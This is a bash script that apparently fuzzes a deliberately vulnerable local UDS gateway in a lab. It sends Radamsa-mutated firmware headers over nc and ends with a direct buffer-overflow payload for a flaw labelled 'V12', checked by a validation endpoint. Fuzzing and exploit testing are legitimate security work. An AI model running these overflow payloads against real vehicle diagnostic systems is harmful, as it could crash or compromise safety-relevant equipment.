#!/bin/bash
# Radamsa mutation fuzzer for V12 - UDS Firmware Header Overflow

set -e

HOST=127.0.0.1
PORT=9556
ITERATIONS=30
SEED_DIR=/tmp/radamsa_seeds
OUTPUT_DIR=/tmp/radamsa_output
CRASH_DIR=/tmp/radamsa_crashes

echo "============================================"
echo "Radamsa Firmware Header Fuzzer - V12"
echo "============================================"
echo "Target: $HOST:$PORT"
echo "Iterations: $ITERATIONS"
echo

mkdir -p "$SEED_DIR" "$OUTPUT_DIR" "$CRASH_DIR"

# Create seed firmware headers
echo "[*] Creating seed files..."

# Seed 1: Valid header (name_len=12)
printf '\x55\x44\x43\x46\x00\x01\x00\x0CTestFirmware' > "$SEED_DIR/seed_valid.bin"
echo "    seed_valid.bin (name_len=12, valid)"

# Seed 2: Boundary header (name_len=32, max safe)
printf '\x55\x44\x43\x46\x00\x01\x00\x20' > "$SEED_DIR/seed_boundary.bin"
head -c 32 /dev/zero | tr '\0' 'A' >> "$SEED_DIR/seed_boundary.bin"
echo "    seed_boundary.bin (name_len=32, boundary)"

# Seed 3: Overflow header (name_len=100, triggers V12)
printf '\x55\x44\x43\x46\x00\x01\x00\x64' > "$SEED_DIR/seed_overflow.bin"
head -c 100 /dev/zero | tr '\0' 'A' >> "$SEED_DIR/seed_overflow.bin"
echo "    seed_overflow.bin (name_len=100, overflow)"

# Seed 4: Max name_len
printf '\x55\x44\x43\x46\x00\x01\xFF\xFF' > "$SEED_DIR/seed_maxlen.bin"
head -c 256 /dev/zero | tr '\0' 'B' >> "$SEED_DIR/seed_maxlen.bin"
echo "    seed_maxlen.bin (name_len=65535, max)"

echo

# Fuzzing loop
echo "[*] Starting Radamsa mutation fuzzing..."
echo

seeds=("$SEED_DIR"/seed_*.bin)
seed_count=${#seeds[@]}
crash_count=0

for ((i=1; i<=ITERATIONS; i++)); do
    seed_idx=$(( (i-1) % seed_count ))
    seed_file="${seeds[$seed_idx]}"
    seed_name=$(basename "$seed_file")

    # Mutate with Radamsa
    mutated_file="$OUTPUT_DIR/mutated_${i}.bin"
    radamsa "$seed_file" > "$mutated_file" 2>/dev/null

    mutated_size=$(wc -c < "$mutated_file")

    # Create TransferData request: [0x36] [0x01] [mutated_header]
    request_file="$OUTPUT_DIR/request_${i}.bin"
    printf '\x36\x01' > "$request_file"
    cat "$mutated_file" >> "$request_file"

    # Send to UDS gateway
    resp=$(timeout 2 nc -q 1 $HOST $PORT < "$request_file" 2>/dev/null | xxd -p) || true

    crashed=0
    if [[ -z "$resp" ]]; then
        crashed=1
    fi

    if [[ $((i % 5)) -eq 0 ]] || [[ $crashed -eq 1 ]]; then
        status="OK"
        [[ -z "$resp" ]] && status="NO_RESPONSE"
        echo "  [$i/$ITERATIONS] seed=$seed_name mutated=${mutated_size}B resp=${resp:0:20} ($status)"
    fi

    if [[ $crashed -eq 1 ]]; then
        cp "$mutated_file" "$CRASH_DIR/crash_${i}_header.bin"
        cp "$request_file" "$CRASH_DIR/crash_${i}_request.bin"
        crash_count=$((crash_count + 1))
    fi

    rm -f "$mutated_file" "$request_file"
    sleep 0.1
done

echo
echo "============================================"
echo "Radamsa Fuzzing Complete"
echo "============================================"
echo "Iterations: $ITERATIONS"
echo "Crashes: $crash_count"
echo "Crash inputs: $CRASH_DIR"
echo

# Direct V12 exploit as Radamsa would discover
echo "[*] Sending direct overflow (name_len=200, buffer=32)..."
printf '\x36\x01\x55\x44\x43\x46\x00\x01\x00\xC8' > /tmp/v12_payload.bin
head -c 200 /dev/zero | tr '\0' 'X' >> /tmp/v12_payload.bin
resp=$(timeout 2 nc -q 1 $HOST $PORT < /tmp/v12_payload.bin 2>/dev/null | xxd -p) || true
echo "    Response: ${resp:-empty}"
rm -f /tmp/v12_payload.bin

sleep 2
echo
curl -s http://localhost:9999/validate/uds_firmware_overflow | python3 -c '
import sys, json
d = json.loads(sys.stdin.read())
r = "PASS" if d.get("success") else "FAIL"
print(f"[*] V12 Validation: {r}")
if d.get("success"):
    print("[+] V12 TRIGGERED! Firmware header overflow detected by Radamsa.")
'
